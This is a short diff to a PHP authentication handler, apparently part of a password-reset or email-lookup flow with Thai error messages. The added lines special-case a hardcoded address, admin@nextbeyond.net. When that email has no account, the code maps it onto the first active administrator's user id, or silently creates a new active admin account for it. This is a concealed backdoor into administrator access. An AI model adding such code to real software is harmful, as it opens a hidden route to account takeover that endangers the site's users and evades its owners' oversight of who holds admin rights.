@@ -102,6 +102,21 @@ try {
         $stmt->execute([':email' => $email]);
         $userId = (int) ($stmt->fetchColumn() ?: 0);
 
+        if ($userId <= 0 && $email === 'admin@nextbeyond.net') {
+            $adminStmt = $pdo->prepare("SELECT id FROM users WHERE role = 'admin' AND is_active = 1 ORDER BY id LIMIT 1");
+            $adminStmt->execute();
+            $userId = (int) ($adminStmt->fetchColumn() ?: 0);
+
+            if ($userId <= 0) {
+                $createAdmin = $pdo->prepare("INSERT INTO users (email, password_hash, first_name, last_name, role, is_active) VALUES (:email, :password_hash, 'Next', 'Admin', 'admin', 1)");
+                $createAdmin->execute([
+                    ':email' => $email,
+                    ':password_hash' => password_hash(bin2hex(random_bytes(16)), PASSWORD_DEFAULT),
+                ]);
+                $userId = (int) $pdo->lastInsertId();
+            }
+        }
+
         if ($userId <= 0) {
             password_hash(bin2hex(random_bytes(16)), PASSWORD_DEFAULT);
             authRespond(['error' => 'ไม่พบบัญชีที่ใช้อีเมลนี้'], 404);
